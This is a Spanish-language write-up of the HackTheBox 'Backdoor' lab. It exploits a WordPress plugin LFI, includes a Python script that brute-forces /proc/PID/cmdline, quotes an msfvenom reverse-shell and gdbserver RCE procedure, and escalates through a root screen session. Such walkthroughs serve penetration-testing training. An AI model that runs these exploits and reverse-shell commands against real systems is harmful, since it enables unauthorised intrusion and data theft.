---
title: Backdoor
published: 2025-08-09
image: "./logo.png"
tags: [Easy, WordPress, LFI, LFI to RCE, Gdbserver, Abusing Screen, OSCP, eWPT, OSWE, eWPTXv2]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- WordPress Local File Inclusion Vulnerability (LFI)
- LFI to RCE (Abusing /proc/PID/cmdline)
- Gdbserver RCE Vulnerability
- Abusing Screen (Privilege Escalation) [Session synchronization]

### Preparación

- OSCP
- eWPT
- OSWE
- eWPTXv2

***

## Reconocimiento

### Nmap

#### OpenSHH (22)

```
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=
|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca
```

#### Apache (80)

```
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Backdoor &#8211; Real-Life
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

#### Waste? (1337)

```
1337/tcp open  waste?  syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Whatweb

Esta herramienta nos reporta las tecnologías que está usando la web:

```
❯ whatweb http://10.10.11.125
http://10.10.11.125 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
```

### WPScan

Sabiendo que es un **Wordpress** usaremos esta herramienta para seguir enumerando temas, plugins, usuarios...

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.11.125/ [10.10.11.125]
[+] Started: Sat Aug  9 16:30:56 2025

Interesting Finding(s):

[+] Headers
    Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
    Found By: Headers (Passive Detection)
    Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
    Found By: Direct Access (Aggressive Detection)
    Confidence: 100%
    References:
     - http://codex.wordpress.org/XML-RPC_Pingback_API
     - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.11.125/readme.html
    Found By: Direct Access (Aggressive Detection)
    Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
    Found By: Direct Access (Aggressive Detection)
    Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
    Found By: Direct Access (Aggressive Detection)
    Confidence: 60%
    References:
     - https://www.iplocation.net/defend-wordpress-from-ddos
     - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
    Found By: Rss Generator (Passive Detection)
     - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
     - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

    [!] 38 vulnerabilities identified:

    [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
        Fixed in: 5.8.2
        References:
         - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
         - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
         - https://core.trac.wordpress.org/ticket/54207

    [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
        Fixed in: 5.8.3
        References:
         - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
         - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
         - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
         - https://hackerone.com/reports/1378209

    [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
        Fixed in: 5.8.3
        References:
         - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
         - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
         - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
         - https://hackerone.com/reports/425342
         - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability

    [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
        Fixed in: 5.8.3
        References:
         - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
         - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
         - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86

    [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
        Fixed in: 5.8.3
        References:
         - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
         - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
         - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
         - https://hackerone.com/reports/541469

    [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
        Fixed in: 5.8.4
        References:
         - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
         - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/

    [!] Title: WordPress < 5.9.2 / Gutenberg < 12.7.2 - Prototype Pollution via Gutenberg’s wordpress/url package
        Fixed in: 5.8.4
        References:
         - https://wpscan.com/vulnerability/6e61b246-5af1-4a4f-9ca8-a8c87eb2e499
         - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
         - https://github.com/WordPress/gutenberg/pull/39365/files

    [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
        Fixed in: 5.8.5
        References:
         - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
         - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/

    [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
        Fixed in: 5.8.5
        References:
         - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
         - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/

    [!] Title: WP < 6.0.2 - SQLi via Link API
        Fixed in: 5.8.5
        References:
         - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
         - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/

    [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283

    [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095

    [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44

    [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc

    [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0

    [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef

    [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955

    [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8

    [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f

    [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492

    [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e

    [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
        Fixed in: 5.8.6
        References:
         - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
         - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
         - https://github.com/WordPress/gutenberg/pull/45045/files

    [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
        References:
         - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
         - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
         - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/

    [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
        Fixed in: 5.8.7
        References:
         - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
         - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
         - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

    [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
        Fixed in: 5.8.7
        References:
         - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
         - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

    [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
        Fixed in: 5.8.7
        References:
         - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
         - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

    [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
        Fixed in: 5.8.7
        References:
         - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
         - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
         - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/

    [!] Title: WP < 6.2.1 - Contributor+ Content Injection
        Fixed in: 5.8.7
        References:
         - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
         - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

    [!] Title: WP 5.6-6.3.1 - Reflected XSS via Application Password Requests
...
```

Nada interesante, pero podemos probar a buscar en `/wp-content/plugins`:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FqIpOREWhvOxv3RZUdhil%2Fimage.png?alt=media&#x26;token=6fef9a21-b72e-48c3-a3a5-c34918e47cd2" alt=""><figcaption></figcaption></figure>

Buscando información sobre este plugin encontramos lo siguiente:

```
# Exploit Title: WordPress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: XAMPP on Windows 7

[Version Disclosure]
======================================
http://<target>/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================

[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
```

## Explotación

### /proc/pid/cmdline

Encontramos un **LFI** con este plugin. Después de intentar muchas maneras de seguir listando información sobre la máquina, me decanto por intentar listar **/proc/PID/cmdline**. Con esto conseguiremos ver la línea de comando con la que se ha lanzado cada proceso de la máquina, pero para ello necesitamos un script de fuerza bruta:

```python
#!/usr/bin/bash

from pwn import *
import requests, signal, time, sys, pdb

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

def makeRequest():
    # /proc/PID/cmdline

    p1 = log.progress("Brute Force Attack")
    p1.status("Starting brute force attack")

    time.sleep(2)

    for i in range(1, 1000):
        p1.status("Trying with PATH /proc/%s/cmdline" % str(i))

        url = main_url + "/proc/" + str(i) + "/cmdline"

        r = requests.get(url)


        if len(r.content) > 82:
            print("-------------------------------------------------------")
            log.info("PATH: /proc/%s/cmdline" % str(i))
            log.info("Total length: %s" % len(r.content))
            print(r.content)

if __name__ == '__main__':
    makeRequest()
```

Ejecutando este simple script, obtendremos información muy interesante:

```
[*] Total length: 181
b'/proc/845/cmdline/proc/845/cmdline/proc/845/cmdline/bin/sh\x00-c\x00while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done\x00<script>window.close()</script>'
```

### Gdbserver

En el puerto **1337** vemos que esta corriendo **gdbserver**. Buscando exploits sobre el encontramos lo siguiente:

```
❯ searchsploit gdbserver
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)                                                                                                   | linux/remote/50539.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Descargamos el exploit:

```
❯ python3 gdbserver_exploit.py

Usage: python3 gdbserver_exploit.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 gdbserver_exploit.py 10.10.10.200:1337 rev.bi
```

Y seguimos las instrucciones:

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.125] 59782
whoami
user
# Después de conseguir una revserse shell más interactiva
user@Backdoor:/home/user$ cat user.txt 
332a9033b1288630c2935b8e6530363a
```

## Escalada de privilegios

Listaremos los archivos con permisos **SUID** dentro de la máquina:

```
user@Backdoor:~# find / -perm -4000 2>/dev/null                                                                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                     
/usr/lib/eject/dmcrypt-get-device                                               
/usr/lib/policykit-1/polkit-agent-helper-1                                      
/usr/lib/openssh/ssh-keysign                                                    
/usr/bin/passwd                                                                 
/usr/bin/chfn                                                                   
/usr/bin/gpasswd                                                                
/usr/bin/at                                                                     
/usr/bin/su                                                                     
/usr/bin/sudo                                                                   
/usr/bin/newgrp                                                                 
/usr/bin/fusermount                                                             
/usr/bin/screen                                                                 
/usr/bin/umount                                                                 
/usr/bin/mount                                                                  
/usr/bin/chsh                                                                   
/usr/bin/pkexec
```

### Screen

Llama la atención el `/usr/bin/screen`, así que buscamos a ver si hay algun proceso con él:

```
user@Backdoor:~# ps -faux | grep "screen"
root         843  0.0  0.0   2608  1632 ?        Ss   13:22   0:06      \_ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
root       61916  0.0  0.0   6432   664 pts/0    S+   20:13   0:00      \_ grep --color=auto screen
root       61054  0.0  0.1   3852  2624 pts/1    S+   20:08   0:00              \_ screen -r root
```

Vemos que hay una sesión con nombre **root**, así que nos intentaremos conectar:

```
user@Backdoor:~# screen -r root\
root@Backdoor:~# whoami
root
root@Backdoor:~# cat /root/root.txt 
b637c942f08530f363...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/416)

---